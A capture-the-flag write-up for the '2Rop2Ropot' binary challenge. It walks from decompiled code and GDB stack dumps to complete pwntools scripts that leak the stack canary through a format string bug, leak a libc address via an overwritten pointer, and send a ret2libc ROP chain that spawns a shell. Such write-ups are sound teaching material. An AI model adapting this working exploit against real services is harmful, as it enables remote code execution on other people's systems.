# 2Rop2Ropot

## Introduction

The challenge can be accessed remotely using:

```

nc binary-sas.hackthe.space 4242

```

The files present in the remote environment can be downloaded for analysis and local exploit development. The real exploit has to be executed against the remote environment, which contains a `flag.txt` that contains the flag.

There are multiple files present in the download:

- `ropot` - the main binary
- `libc.so.6`
- `flag.txt` - contains a fake flag (local only)

`ropot` appears to be the main binary file. A quick inspection reveals some information about it:

```

» file ropot
ropot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=29098b56af495c9f3d33d126ecfed1c7212259e8, for GNU/Linux 3.2.0, with debug_info, not stripped

» checksec --file=ropot
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols        No    0               3               ropot

```

The binary is not stripped and contains debug information, which means there are symbols present like function names. It has NX enabled and a stack canary before the return point.

- The canary is 8 bytes, so guessing it is infeasible - it must be leaked.
- NX prevents directly writing and executing shellcode on the stack, so execution must be redirected to existing functions/gadgets.
- No PIE means binary addresses (like gadgets) are static across runs, unlike with ASLR-randomized addresses.

Looking at the bundled libc:

```

» file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=274eec488d230825a136fa9c4d85370fed7a0a5e, for GNU/Linux 3.2.0, stripped

```

Different libc versions have different offsets for functions/symbols, which is important for building exploits.

## Running the Binary

Running the binary shows:

```

./ropot
We wake up near a crashed spaceship. Our systems ask for a serial number and the override key before resuming operation.
[!] ENTER SN
>

```

Entering an arbitrary serial number:

```

[!] ENTER SN
>1234
[!] ENTER OVERRIDE KEY
>666666
Override key incorrect. Exiting...

```

There's only one valid override key, unknown at this point. Time to open Ghidra.

### `main`

```c
int main(int argc,char **argv)
{
  char **argv_local;
  int argc_local;

  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  subroutine_init();
  event_loop();
  return 0;
}
```

### `subroutine_init`

```c
void subroutine_init(void)
{
  subroutine_init_serial();
  subroutine_init_override();
  return;
}
```

### Serial number handling (side quest)

```c
void subroutine_init_serial(void)
{
  printf(
        "We wake up near a crashed spaceship. Our systems ask for a serial number and the override key before resuming operation.\n[!] ENTER SN\n>"
        );
  fflush(stdout);
  fgets(serial_number,0x100,stdin);
  return;
}
```

Memory layout:

```

                             serial_number      XREF[8]: subroutine_init_serial:004012b0
                                                          subroutine_init_serial:004012b7
                                                          subroutine_init_override:0040135
                                                          subroutine_init_override:0040135
                                                          subroutine_send_message_loop:004
                                                          subroutine_indecision:0040176f
                                                          subroutine_indecision:00401776
                                                          004050a0
        00405080 75 6e 6b        char[32]   "unknown"
                 6e 6f 77
                 6e 00 00
           00405080 [0]            'u', 'n', 'k', 'n',
           00405084 [4]            'o', 'w', 'n', 00h,
           00405088 [8]            00h, 00h, 00h, 00h,
           0040508c [12]           00h, 00h, 00h, 00h,
           00405090 [16]           00h, 00h, 00h, 00h,
           00405094 [20]           00h, 00h, 00h, 00h,
           00405098 [24]           00h, 00h, 00h, 00h,
           0040509c [28]           00h, 00h, 00h, 00h
                             serial_number_ptr  XREF[1]: subroutine_send_message_loop:004
        004050a0 80 50 40        char *     serial_number    ropot.c:15
                 00 00 00
                 00 00

```

`fgets` reads up to 256 characters into a 32-byte buffer - a buffer overflow. There's also a `serial_number_ptr` pointing to that buffer. Confirming the overflow:

```

[!] ENTER SN
>11111111111111111111111111111111111111111111111111111111111111111
Segmentation fault      (core dumped) ./ropot

```

This confirms memory corruption, to be revisited later.

### Override key - format string vulnerability

```c
void subroutine_init_override(void)
{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  char override_key_buffer [16];

  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  override_key_buffer[0] = '\0';
  override_key_buffer[1] = '\0';
  override_key_buffer[2] = '\0';
  override_key_buffer[3] = '\0';
  override_key_buffer[4] = '\0';
  override_key_buffer[5] = '\0';
  override_key_buffer[6] = '\0';
  override_key_buffer[7] = '\0';
  override_key_buffer[8] = '\0';
  override_key_buffer[9] = '\0';
  override_key_buffer[10] = '\0';
  override_key_buffer[0xb] = '\0';
  override_key_buffer[0xc] = '\0';
  override_key_buffer[0xd] = '\0';
  override_key_buffer[0xe] = '\0';
  override_key_buffer[0xf] = '\0';
  printf("[!] ENTER OVERRIDE KEY\n>");
  fgets(override_key_buffer,0x10,stdin);
  iVar2 = strncmp("918274613",override_key_buffer,9);
  if (iVar2 != 0) {
    puts("Override key incorrect. Exiting...");
    FUN_00401180(0xd);
  }
  printf("After parsing the serial number \'%s\', our systems continue to boot.\nConfirming Override Key: "
         ,serial_number);
  printf(override_key_buffer);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

Only the first 9 bytes are validated against `"918274613"`. The remaining bytes are unchecked - and critically, `printf(override_key_buffer)` passes user input directly as the **format string**, allowing directives like `%p` or `%llx` to leak stack data (return addresses, saved rbp, even the canary).

Testing the valid key:

```

[!] ENTER SN
>123213
[!] ENTER OVERRIDE KEY
>918274613
After parsing the serial number '123213
', our systems continue to boot.
Confirming Override Key: 918274613

We appear to be the only sentient being in the near vicinity.
Our long-range communication unit seems to be damaged, it refuses to be accessed.
Hardly an ideal situation, but one we shall manage nevertheless.

A new dawn breaks, what will we do today? 
(1) search the crash-site for useful debris
(2) work on a beacon
(3) go north towards the sea
(4) go south towards the mountains
(5) study local flora
(6) go to standby
Our decision
>

```

## Exploring the Main Menu

- Option 6 exits with a standby message.
- Options 3, 4, 5 print narrative text and loop back to the menu.
- Option 1 ("search crash-site") collects debris.
- Option 2 ("work on a beacon") uses that debris to assemble a beacon, then opens a submenu:

```

The beacon works, we will make sure to send a good message into the aether.
(1) set message
(2) show message
(3) send message
(4) do something else
Our decision: 
>

```

Testing option 1 (set message) then option 2 (show message):

```

>1
We see a terminal. It says "Please enter message to broadcast" and waits for our input:
>hello

>2
Message to be sent:
hello
ing for user set message..
FROM:123213

```

Sending the message (option 3) triggers a broadcast and exits. Choosing more than 5 options total also exits the program.

## Diving Into the Beacon Path

```c
int main(int argc, char **argv) {
  setvbuf(stdin,  NULL, 2, 0);
  setvbuf(stdout, NULL, 2, 0);
  setvbuf(stderr, NULL, 2, 0);
  subroutine_init();
  event_loop();
  return 0;
}

void event_loop(void) {
  int days_passed, action;

  puts("\nWe appear to be the only sentient being ...");
  for (days_passed = 0; days_passed < 5; days_passed++) {
    action = subroutine_decide_on_action(
      "A new dawn breaks, what will we do today? \n"
      "(1) search the crash-site for useful debris\n"
      "(2) work on a beacon\n"
      "(3) go north towards the sea\n"
      "(4) go south towards the mountains\n"
      "(5) study local flora\n"
      "(6) go to standby\n"
      "Our decision\n>"
    );

    switch (action) {
      default: subroutine_indecision();       break; // benign text path
      case 1:  subroutine_search_crashsite(); break; // state/text
      case 2:  subroutine_work_beacon();      break; // interesting
      case 3:  subroutine_go_north();         break; // state/text
      case 4:  subroutine_go_south();         break; // state/text
      case 5:  subroutine_study_flora();      break; // state/text
      case 6:  subroutine_standby();               ; // exit/standby
    }
    putchar('\n');
  }
  subroutine_standby();
}

void subroutine_work_beacon(void) {
  if (have_assembled == 0) {
    if (have_debris == 0) {
      puts("... salvage some better materials ...");
    } else {
      have_debris = 0;
      have_assembled = 0;
      puts("... now we can send our message!");
      putchar('\n');
      subroutine_send_message_loop(); // enter message UI
    }
  } else {
    subroutine_send_message_loop();   // directly if already assembled
  }
}
```

### The vulnerable read: 300-byte buffer, 512-byte read

```c
void subroutine_send_message_loop(void) {
  int message_is_unchanged;
  int action;
  char message_to_send[300];

  builtin_strncpy(message_to_send, "..waiting for user set message..", 0x20);
  // ... buffer clearing elided ...

  do {
    action = subroutine_decide_on_action(
      "The beacon works ...\n"
      "(1) set message\n(2) show message\n(3) send message\n(4) do something else\n"
      "Our decision: \n>"
    );

    if (action == 3) {
      // send path requires message to be set
      // ...
    } else {
      if (action > 3) { puts("We leave the beacon be for now."); return; }

      if (action == 1) {
        printf("... \"Please enter message to broadcast\" ...\n>");
        fflush(NULL);
        read(0, message_to_send, 0x200);  // VULNERABLE READ (size 512)
        //               ^^^^^^^^^^^^^^^
        // message_to_send is 300 bytes, but up to 512 bytes are read.
      } else if (action == 2) {
        printf("Message to be sent:\n%s\n", message_to_send);
        printf("FROM:%s\n", serial_number_ptr);
      } else {
        puts("We leave the beacon be for now.");
        return;
      }
    }
    putchar('\n');
  } while (true);
}
```

`message_to_send` is 300 bytes on the stack, but `read()` accepts up to 512 bytes - a classic stack buffer overflow in the "set message" path. Overflowing past the buffer lets me overwrite the stack canary, saved rbp, and saved return address. Since a canary is present, it must be leaked and written back unchanged before placing a ROP chain.

Also notable: option 2 prints via `serial_number_ptr`, not `serial_number` directly - this becomes important later for an arbitrary-read primitive.

## Overflow Experiment and Canary Boundary

Testing overflow lengths with option 1, then returning via option 4:

- 300 bytes: no crash, safely returns.
- 311 bytes: no crash, still below the canary boundary.
- 312 bytes: canary check fails.

```

Our decision: 
>4

We leave the beacon be for now.
*** stack smashing detected ***: terminated
Aborted                    (core dumped) ./ropot

```

This confirms the offset from `message_to_send` to the canary is 312 bytes.

### Verifying in GDB (breakpoint after `read`)

Sending 311 bytes of `a` and inspecting the stack:

```

x/40gx $rbp-256
0x7fffffffe150: 0x6161616161616161      0x6161616161616161
0x7fffffffe160: 0x6161616161616161      0x6161616161616161
0x7fffffffe170: 0x6161616161616161      0x6161616161616161
0x7fffffffe180: 0x6161616161616161      0x6161616161616161
0x7fffffffe190: 0x6161616161616161      0x6161616161616161
0x7fffffffe1a0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1b0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1c0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1d0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1e0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1f0: 0x6161616161616161      0x6161616161616161
0x7fffffffe200: 0x6161616161616161      0x6161616161616161
0x7fffffffe210: 0x6161616161616161      0x6161616161616161
0x7fffffffe220: 0x6161616161616161      0x6161616161616161
0x7fffffffe230: 0x6161616161616161      0x6161616161616161
0x7fffffffe240: 0x0a61616161616161      0x9ca0b13ac2047100
0x7fffffffe250: 0x00007fffffffe260      0x00000000004016d6

```

Reading this:

- `0x6161...` = repeated `a` bytes filling `message_to_send`.
- `0x0a` at the end of the 311-byte block is the trailing newline, sitting right before the canary.
- `0x9ca0b13ac2047100` is the 8-byte canary (note the trailing `00` LSB - typical for stack canaries).
- `0x00007fffffffe260` is the saved rbp.
- `0x00000000004016d6` is the saved return address.

## Leaking the Stack Canary

The goal: leak the canary, then overwrite the saved return address with a ROP chain that spawns a shell. Since the canary changes each run, it must first be recovered so it can be written back unchanged, preserving stack integrity while redirecting execution.

The format string bug in `subroutine_init_override` provides the leak. Because `override_key_buffer` is used directly as a format string, a positional specifier like `%9$llx` prints the 9th "variadic argument" `printf` fetches from the stack - which in this layout happens to be the canary.

### Verifying in GDB

Breakpoint after the `printf` call, inspecting the stack:

```

0x7fffffffe250: 0x6161616161616161      0x0061616161616161
0x7fffffffe260: 0x00007fffffffe270      0xdeadca9e72c5d200
0x7fffffffe270: 0x00007fffffffe280      0x00000000004013b3

```

### Live demonstration

```

[!] ENTER SN
>123123
[!] ENTER OVERRIDE KEY
>918274613%9$llx
After parsing the serial number '123123
', our systems continue to boot.
Confirming Override Key: 918274613beffd0e4bb27500

```

The trailing `00` confirms the canary's low byte is zero, consistent with earlier observations.

### Script - Stage 1: Leak the canary

```python
from pwn import *
import re

p = remote('binary-sas.hackthe.space', 4242)
ropot = ELF("./ropot")  # Keep local binary for GOT address

# Wait for the first input prompt
p.recvuntil(b'ENTER SN\n>')
p.sendline("123123")  # Serial number, arbitrary

# Wait for the override key prompt
p.recvuntil(b'ENTER OVERRIDE KEY\n>')
payload = b'918274613%9$llx'
p.sendline(payload)

# Read all output up to the end of the confirmation message
output = p.recvuntil(b'vicinity.')

# Extract canary from output using regex
match = re.search(rb'Confirming Override Key: 918274613([a-f0-9]{16})', output)
if match:
    canary_hex = match.group(1)
    canary = int(canary_hex, 16)
    print(f"Leaked canary hex: {canary_hex.decode()}")
    print(canary_hex)
    print(f"Leaked canary int: {canary:#x}")
else:
    print("Could not find canary! Check output and adjust script.")
    exit(1)
```

This connects to the remote server, submits the serial number, then sends the canary-leaking payload as the override key, and parses the leaked canary from the response.

## Leaking a libc Address

The plan for full exploitation:

1. **Leak the canary** - via the format string bug, to bypass stack protection during overflow.
2. **Leak a libc address** - by pointing `serial_number_ptr` at the GOT entry of `puts`, then reading it via the beacon's "show message" option, to defeat ASLR.
3. **Calculate libc base and target addresses** - using the puts leak and known offsets from the provided `libc.so.6` to resolve `system`, `/bin/sh`, and needed gadgets.
4. **Build and deliver the ROP chain** - preserving the canary, then overwriting the return address with a chain that calls `system("/bin/sh")`.
5. **Interact with the shell** - switch to interactive mode and read `flag.txt`.

Checking the libc's protections:

```

$ checksec --file=libc.so.6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    DSO             No RPATH   No RUNPATH   No Symbols      N/A     83              167             libc.so.6

```

Implications:

- **NX + Full RELRO**: can't inject shellcode or overwrite GOT, but can still return into valid libc code.
- **PIE/DSO**: libc is loaded at a randomized base each run, so absolute addresses must be leaked.
- **No canary in libc**: irrelevant here since the vulnerable function lives in the main binary, which does have a canary.

Since gadgets like `pop rdi; ret` aren't available in the non-PIE main binary, the plan pivots to a **ret2libc** strategy, using gadgets and function addresses from the provided libc once its base is known.

### The leak primitive: `serial_number_ptr`

Recall `printf("FROM:%s\n", serial_number_ptr);` in `subroutine_send_message_loop`. Since `serial_number_ptr` is fully attacker-controlled (set during the serial number prompt), pointing it at `puts@GOT` and then triggering "show message" leaks the resolved runtime address of `puts`.

```python
p.recvuntil(b'ENTER SN\n>')
p.sendline(b'a'*32 + p64(ropot.got['puts']))
```

Navigating to the beacon's show message option:

```python
for choice in [b'1', b'2', b'2']:
    p.recvuntil(b'Our decision')
    p.sendline(choice)

blk = p.recvuntil(b'Our decision:')
leaked_addr = 0
m = re.search(rb'FROM:\s*([^\r\n]*)', blk)
if m:
    leaked_addr = m.group(1)

print(leaked_addr)
```

Example output:

```

Message to be sent:
..waiting for user set message..
FROM:\xe0\xebo\x91\xf3p

```

The bytes after `FROM:` are the runtime address of `puts@got`, giving the needed libc leak to bypass ASLR.

## Deploying the ROP Chain

### Resolving libc addresses

```python
libc = ELF('./libc.so.6')

# `leaked_adrr` is the raw GOT value obtained from the previous step.
leaked_puts = int.from_bytes(leaked_adrr.ljust(8, b'\x00'), 'little')

libc_base   = leaked_puts - libc.symbols['puts']

system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh\x00'))
```

- `system_addr`: real address of `system()`.
- `binsh_addr`: real address of the `"/bin/sh"` string.

### Finding gadgets in libc

```python
rop_all = ROP([libc])
pop_rdi = libc_base + rop_all.find_gadget(['pop rdi', 'ret']).address
ret     = libc_base + rop_all.find_gadget(['ret']).address
```

- `pop_rdi`: sets the first argument register for `system`.
- `ret`: extra gadget for 16-byte stack alignment before the `system` call, satisfying the AMD64 calling convention.

### Building and sending the payload

```python
p.sendline(b"1")  # Select "set message" menu option

payload = (
    b'a' * 312 +              # Fill up to the canary
    p64(canary) +             # Correct canary to bypass stack protections
    b'B' * 8 +                # Filler for saved RBP
    p64(pop_rdi) +            # Gadget: pop rdi; ret
    p64(binsh_addr) +         # Argument to system: pointer to "/bin/sh"
    p64(ret) +                # Extra ret for 16-byte alignment
    p64(system_addr)          # Call system("/bin/sh")
)

p.sendline(payload)
p.interactive()
```

The chain:

1. Fills the buffer up to the canary offset.
2. Writes back the correct leaked canary.
3. Fills the saved rbp slot (value doesn't matter).
4. `pop rdi; ret` - loads `/bin/sh` address into `rdi`.
5. Extra `ret` - fixes stack alignment.
6. Calls `system("/bin/sh")`.

### Triggering execution

```

We see a terminal. It says "Please enter message to broadcast" and waits for our input:
>
The beacon works, we will make sure to send a good message into the aether.
(1) set message
(2) show message
(3) send message
(4) do something else
Our decision: 
>$ 4

We leave the beacon be for now.
$ ls
flag.txt
run

```

Selecting option 4 to exit the beacon message menu triggers the function return - and with it, the ROP chain. The overwritten return address redirects execution to `system("/bin/sh")`, dropping into a shell. Running `ls` confirms code execution, and `flag.txt` is right there for the taking.
